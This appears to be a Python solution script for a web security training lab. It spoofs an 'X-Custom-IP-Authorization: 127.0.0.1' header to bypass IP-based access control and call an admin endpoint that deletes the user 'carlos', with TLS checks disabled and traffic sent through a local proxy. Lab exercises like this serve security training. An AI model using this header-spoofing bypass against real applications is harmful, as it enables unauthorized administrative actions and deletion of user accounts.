import requests
import sys
import urllib3
import re 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_carlos(s, url):

    delete_carlos_url = url + "/admin/delete?username=carlos"
    headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
    r = s.get(delete_carlos_url, headers=headers, verify=False, proxies=proxies)
    if "Congratulations" in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Could not delete user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    delete_carlos(s, url)

if __name__ == "__main__":
    main()